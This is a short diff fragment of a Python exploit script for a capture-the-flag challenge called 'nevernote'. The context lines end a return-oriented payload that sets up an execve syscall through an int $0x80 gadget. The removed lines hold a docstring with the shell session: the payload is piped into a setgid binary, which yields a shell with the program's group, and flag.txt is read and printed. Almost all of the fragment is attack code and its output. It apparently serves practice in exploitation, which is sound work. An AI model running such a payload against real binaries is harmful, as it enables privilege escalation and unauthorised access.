@@ -22,12 +22,3 @@ p += pack('<L', 0xb)        # execve
 p += pack('<L', 0xf7e4a615) # int $0x80
 
 print p
-
-
-"""
-pico22418@shell:/tmp/sigsegv$ cat <(python nevernote.py) - |  /home/nevernote/nevernote
-Please enter your name: Enter a command: Write your note: id
-uid=13315(pico22418) gid=1017(picogroup) egid=1011(nevernote) groups=1017(picogroup)
-cat /home/nevernote/flag.txt
-the_hairy_canary_fairy_is_still_very_wary
-"""
